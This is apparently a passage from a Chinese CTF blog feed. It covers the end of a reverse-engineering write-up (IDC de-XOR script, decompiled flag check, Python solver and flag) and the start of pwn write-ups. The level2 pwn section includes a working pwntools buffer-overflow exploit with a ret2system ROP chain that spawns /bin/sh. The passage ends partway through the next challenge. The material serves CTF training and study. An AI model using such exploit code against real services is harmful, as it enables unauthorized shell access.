class="hljs-number">10</span>)</span><br><span class="line">            flag = v11;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">11</span>)</span><br><span class="line">            flag = v12;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">12</span>)</span><br><span class="line">            flag = v13;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">13</span>)</span><br><span class="line">            flag = v14;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">14</span>)</span><br><span class="line">            flag = v15;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">15</span>)</span><br><span class="line">            flag = v16;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">16</span>)</span><br><span class="line">            flag = v17;</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">18</span> == <span class="hljs-number">17</span>)</span><br><span class="line">            flag = v18;</span><br><span class="line">        <span class="hljs-built_in">PatchByte</span>(addr, <span class="hljs-built_in">Byte</span>(addr) ^ flag);</span><br><span class="line">        i++;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">AnalyzeArea</span>(start, end);</span><br><span class="line">    <span class="hljs-built_in">Message</span>(<span class="hljs-string">"Down!"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>不是很会用IDC，而且还没有数组类型，只能这样用很多分支去判断，然后得到了新的汇编代码，如果是汇编很好的话就可以直接做了，我还是习惯了无脑<code>F5</code>，所以干脆<code>patch</code>了一下后面的垃圾数据，写了一个<code>retn</code>，然后创建函数，查看伪代码</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_10040164D</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> Str[<span class="hljs-number">74</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v2[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+6Ah] [rbp-16h]</span></span><br><span class="line">  __int16 v3; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// [rsp+7Ah] [rbp-6h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+7Bh] [rbp-5h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v6[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+80h] [rbp+0h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v7[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+A0h] [rbp+20h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> Format[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+D0h] [rbp+50h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [rsp+110h] [rbp+90h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// [rsp+114h] [rbp+94h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// [rsp+118h] [rbp+98h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [rsp+11Ch] [rbp+9Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v13; <span class="hljs-comment">// [rsp+120h] [rbp+A0h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v14; <span class="hljs-comment">// [rsp+124h] [rbp+A4h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v15; <span class="hljs-comment">// [rsp+128h] [rbp+A8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v16; <span class="hljs-comment">// [rsp+12Ch] [rbp+ACh]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v17; <span class="hljs-comment">// [rsp+130h] [rbp+B0h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v18; <span class="hljs-comment">// [rsp+134h] [rbp+B4h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v19; <span class="hljs-comment">// [rsp+138h] [rbp+B8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v20; <span class="hljs-comment">// [rsp+13Ch] [rbp+BCh]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v21; <span class="hljs-comment">// [rsp+140h] [rbp+C0h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v22; <span class="hljs-comment">// [rsp+144h] [rbp+C4h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v23; <span class="hljs-comment">// [rsp+148h] [rbp+C8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v24; <span class="hljs-comment">// [rsp+14Ch] [rbp+CCh]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v25; <span class="hljs-comment">// [rsp+150h] [rbp+D0h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v26; <span class="hljs-comment">// [rsp+154h] [rbp+D4h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v27; <span class="hljs-comment">// [rsp+158h] [rbp+D8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v28; <span class="hljs-comment">// [rsp+15Ch] [rbp+DCh]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v29; <span class="hljs-comment">// [rsp+160h] [rbp+E0h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v30; <span class="hljs-comment">// [rsp+164h] [rbp+E4h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v31; <span class="hljs-comment">// [rsp+168h] [rbp+E8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v32; <span class="hljs-comment">// [rsp+16Ch] [rbp+ECh]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v33; <span class="hljs-comment">// [rsp+170h] [rbp+F0h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v34; <span class="hljs-comment">// [rsp+174h] [rbp+F4h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v35; <span class="hljs-comment">// [rsp+178h] [rbp+F8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v36; <span class="hljs-comment">// [rsp+17Ch] [rbp+FCh]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v37; <span class="hljs-comment">// [rsp+180h] [rbp+100h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v38; <span class="hljs-comment">// [rsp+184h] [rbp+104h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v39; <span class="hljs-comment">// [rsp+188h] [rbp+108h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v40; <span class="hljs-comment">// [rsp+18Ch] [rbp+10Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v41; <span class="hljs-comment">// [rsp+190h] [rbp+110h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v42; <span class="hljs-comment">// [rsp+194h] [rbp+114h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v43; <span class="hljs-comment">// [rsp+198h] [rbp+118h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v44; <span class="hljs-comment">// [rsp+19Ch] [rbp+11Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v45; <span class="hljs-comment">// [rsp+1A0h] [rbp+120h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v46; <span class="hljs-comment">// [rsp+1A4h] [rbp+124h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v47; <span class="hljs-comment">// [rsp+1A8h] [rbp+128h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v48; <span class="hljs-comment">// [rsp+1ACh] [rbp+12Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v49; <span class="hljs-comment">// [rsp+1B0h] [rbp+130h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v50; <span class="hljs-comment">// [rsp+1B4h] [rbp+134h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v51; <span class="hljs-comment">// [rsp+1B8h] [rbp+138h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v52; <span class="hljs-comment">// [rsp+1BCh] [rbp+13Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v53; <span class="hljs-comment">// [rsp+1C0h] [rbp+140h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v54; <span class="hljs-comment">// [rsp+1C4h] [rbp+144h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v55; <span class="hljs-comment">// [rsp+1C8h] [rbp+148h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v56; <span class="hljs-comment">// [rsp+1CCh] [rbp+14Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v57; <span class="hljs-comment">// [rsp+1D0h] [rbp+150h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v58; <span class="hljs-comment">// [rsp+1D4h] [rbp+154h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v59; <span class="hljs-comment">// [rsp+1D8h] [rbp+158h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v60; <span class="hljs-comment">// [rsp+1E0h] [rbp+160h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v61; <span class="hljs-comment">// [rsp+1E4h] [rbp+164h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v62; <span class="hljs-comment">// [rsp+1E8h] [rbp+168h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+1ECh] [rbp+16Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="hljs-number">2007666</span>;</span><br><span class="line">  v10 = <span class="hljs-number">2125764</span>;</span><br><span class="line">  v11 = <span class="hljs-number">1909251</span>;</span><br><span class="line">  v12 = <span class="hljs-number">2027349</span>;</span><br><span class="line">  v13 = <span class="hljs-number">2421009</span>;</span><br><span class="line">  v14 = <span class="hljs-number">1653372</span>;</span><br><span class="line">  v15 = <span class="hljs-number">2047032</span>;</span><br><span class="line">  v16 = <span class="hljs-number">2184813</span>;</span><br><span class="line">  v17 = <span class="hljs-number">2302911</span>;</span><br><span class="line">  v18 = <span class="hljs-number">2263545</span>;</span><br><span class="line">  v19 = <span class="hljs-number">1909251</span>;</span><br><span class="line">  v20 = <span class="hljs-number">2165130</span>;</span><br><span class="line">  v21 = <span class="hljs-number">1968300</span>;</span><br><span class="line">  v22 = <span class="hljs-number">2243862</span>;</span><br><span class="line">  v23 = <span class="hljs-number">2066715</span>;</span><br><span class="line">  v24 = <span class="hljs-number">2322594</span>;</span><br><span class="line">  v25 = <span class="hljs-number">1987983</span>;</span><br><span class="line">  v26 = <span class="hljs-number">2243862</span>;</span><br><span class="line">  v27 = <span class="hljs-number">1869885</span>;</span><br><span class="line">  v28 = <span class="hljs-number">2066715</span>;</span><br><span class="line">  v29 = <span class="hljs-number">2263545</span>;</span><br><span class="line">  v30 = <span class="hljs-number">1869885</span>;</span><br><span class="line">  v31 = <span class="hljs-number">964467</span>;</span><br><span class="line">  v32 = <span class="hljs-number">944784</span>;</span><br><span class="line">  v33 = <span class="hljs-number">944784</span>;</span><br><span class="line">  v34 = <span class="hljs-number">944784</span>;</span><br><span class="line">  v35 = <span class="hljs-number">728271</span>;</span><br><span class="line">  v36 = <span class="hljs-number">1869885</span>;</span><br><span class="line">  v37 = <span class="hljs-number">2263545</span>;</span><br><span class="line">  v38 = <span class="hljs-number">2283228</span>;</span><br><span class="line">  v39 = <span class="hljs-number">2243862</span>;</span><br><span class="line">  v40 = <span class="hljs-number">2184813</span>;</span><br><span class="line">  v41 = <span class="hljs-number">2165130</span>;</span><br><span class="line">  v42 = <span class="hljs-number">2027349</span>;</span><br><span class="line">  v43 = <span class="hljs-number">1987983</span>;</span><br><span class="line">  v44 = <span class="hljs-number">2243862</span>;</span><br><span class="line">  v45 = <span class="hljs-number">1869885</span>;</span><br><span class="line">  v46 = <span class="hljs-number">2283228</span>;</span><br><span class="line">  v47 = <span class="hljs-number">2047032</span>;</span><br><span class="line">  v48 = <span class="hljs-number">1909251</span>;</span><br><span class="line">  v49 = <span class="hljs-number">2165130</span>;</span><br><span class="line">  v50 = <span class="hljs-number">1869885</span>;</span><br><span class="line">  v51 = <span class="hljs-number">2401326</span>;</span><br><span class="line">  v52 = <span class="hljs-number">1987983</span>;</span><br><span class="line">  v53 = <span class="hljs-number">2243862</span>;</span><br><span class="line">  v54 = <span class="hljs-number">2184813</span>;</span><br><span class="line">  v55 = <span class="hljs-number">885735</span>;</span><br><span class="line">  v56 = <span class="hljs-number">2184813</span>;</span><br><span class="line">  v57 = <span class="hljs-number">2165130</span>;</span><br><span class="line">  v58 = <span class="hljs-number">1987983</span>;</span><br><span class="line">  v59 = <span class="hljs-number">2460375</span>;</span><br><span class="line">  <span class="hljs-built_in">strcpy</span>(Format, <span class="hljs-string">"Input the flag to hijack the ability of Hiden Intelligence:"</span>);</span><br><span class="line">  <span class="hljs-built_in">strcpy</span>(v7, <span class="hljs-string">"Progrise Key confirmed. Ready to break.\n"</span>);</span><br><span class="line">  <span class="hljs-built_in">strcpy</span>(v6, <span class="hljs-string">"Jacking Break! Zaia Enterprise."</span>);</span><br><span class="line">  <span class="hljs-built_in">strcpy</span>(v5, <span class="hljs-string">"%59s"</span>);</span><br><span class="line">  v3 = <span class="hljs-number">29477</span>;</span><br><span class="line">  v4 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">strcpy</span>(v2, <span class="hljs-string">"Not verified!"</span>);</span><br><span class="line">  v62 = <span class="hljs-number">2147483659</span>;</span><br><span class="line">  <span class="hljs-built_in">printf</span>(Format);</span><br><span class="line">  <span class="hljs-built_in">scanf</span>(v5, Str);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(v7);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(Str) != <span class="hljs-number">51</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">printf</span>(v2);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  v61 = <span class="hljs-number">19683</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">0x32</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    v60 = v61 * (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">unsigned</span> __int8)Str[i] % v62;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v60 != *(&amp;v9 + i) )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">printf</span>(v2);</span><br><span class="line">      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">printf</span>(v6);</span><br><span class="line">  <span class="hljs-built_in">getchar</span>();</span><br><span class="line">  result = <span class="hljs-built_in">getchar</span>();</span><br><span class="line">  __asm { icebp }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>关键的处理只有一句，但是有个很烦的取余，仔细观察可以发现，<code>v62</code>这个数非常大，最后在计算的时候取不取这个余数都没关系，所以这一部分又变成了一个非常简单的除法，然后问题就很容易解决了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v9 = [<span class="hljs-number">2007666</span>, <span class="hljs-number">2125764</span>, <span class="hljs-number">1909251</span>, <span class="hljs-number">2027349</span>, <span class="hljs-number">2421009</span>, <span class="hljs-number">1653372</span>, <span class="hljs-number">2047032</span>, <span class="hljs-number">2184813</span>, <span class="hljs-number">2302911</span>, <span class="hljs-number">2263545</span>, <span class="hljs-number">1909251</span>, <span class="hljs-number">2165130</span>,</span><br><span class="line">      <span class="hljs-number">1968300</span>, <span class="hljs-number">2243862</span>, <span class="hljs-number">2066715</span>, <span class="hljs-number">2322594</span>, <span class="hljs-number">1987983</span>, <span class="hljs-number">2243862</span>, <span class="hljs-number">1869885</span>, <span class="hljs-number">2066715</span>, <span class="hljs-number">2263545</span>, <span class="hljs-number">1869885</span>, <span class="hljs-number">964467</span>, <span class="hljs-number">944784</span>, <span class="hljs-number">944784</span>,</span><br><span class="line">      <span class="hljs-number">944784</span>, <span class="hljs-number">728271</span>, <span class="hljs-number">1869885</span>, <span class="hljs-number">2263545</span>, <span class="hljs-number">2283228</span>, <span class="hljs-number">2243862</span>, <span class="hljs-number">2184813</span>, <span class="hljs-number">2165130</span>, <span class="hljs-number">2027349</span>, <span class="hljs-number">1987983</span>, <span class="hljs-number">2243862</span>, <span class="hljs-number">1869885</span>, <span class="hljs-number">2283228</span>,</span><br><span class="line">      <span class="hljs-number">2047032</span>, <span class="hljs-number">1909251</span>, <span class="hljs-number">2165130</span>, <span class="hljs-number">1869885</span>, <span class="hljs-number">2401326</span>, <span class="hljs-number">1987983</span>, <span class="hljs-number">2243862</span>, <span class="hljs-number">2184813</span>, <span class="hljs-number">885735</span>, <span class="hljs-number">2184813</span>, <span class="hljs-number">2165130</span>, <span class="hljs-number">1987983</span>,</span><br><span class="line">      <span class="hljs-number">2460375</span>]</span><br><span class="line">v61 = <span class="hljs-number">19683</span></span><br><span class="line">v62 = <span class="hljs-number">0x8000000B</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x33</span>):</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(v9[i] // v61)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>输出flag</p><figure class="highlight sqf hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">flag</span>{Thousandriver_is_1000%<span class="hljs-variable">_stronger_than_zero</span>-one}</span><br></pre></td></tr></tbody></table></figure><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>然后这次比赛就没打算再做了，<code>mobile</code>的题，研究了一下，应该不是特别难，但是没太有时间，又是作业又是网课又是美赛，让人很烦，如果后面有wp放出来的话再去研究研究，复现一下，做个补充。</p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 高校战“疫” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-pwn部分题解（一）</title>
      <link href="/2020/03/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/03/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>一直做re觉得有些枯燥，闲着没事做一做好久没碰的pwn</p><span id="more"></span><h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p><code>checksec</code>一下，开了NX</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-built_in">vulnerable_function</span>();</span><br><span class="line">  <span class="hljs-built_in">system</span>(<span class="hljs-string">"echo 'Hello World!'"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">vulnerable_function</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">system</span>(<span class="hljs-string">"echo Input:"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>u);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>程序中调用了system，在字符串视图里也找到了<code>"/bin/sh"</code>，所以构造一个ROP就可以，exp如下</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">io=process(<span class="hljs-string">'./level2'</span>)</span><br><span class="line"><span class="hljs-comment"># io=remote('111.198.29.45',52249)</span></span><br><span class="line">elf=ELF(<span class="hljs-string">'./level2'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=elf.symbols[<span class="hljs-string">'system'</span>]</span><br><span class="line"></span><br><span class="line">sh_addr=elf.search(<span class="hljs-string">'/bin/sh'</span>).<span class="hljs-built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload=<span class="hljs-string">'a'</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(sys_addr)+p32(<span class="hljs-number">0</span>)+p32(sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h4 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h4><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  FILE *v3; <span class="hljs-comment">// rdi</span></span><br><span class="line">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v4; <span class="hljs-comment">// rdi</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v9; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v11; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0LL</span>);</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0LL</span>);</span><br><span class="line">  v3 = stderr;</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0LL</span>);</span><br><span class="line">  v6 = <span class="hljs-number">0</span>;</span><br><span class="line">  v8 = <span class="hljs-number">0</span>;</span><br><span class="line">  *(_QWORD *)seed = <span class="hljs-built_in">sub_BB0</span>(v3, <span 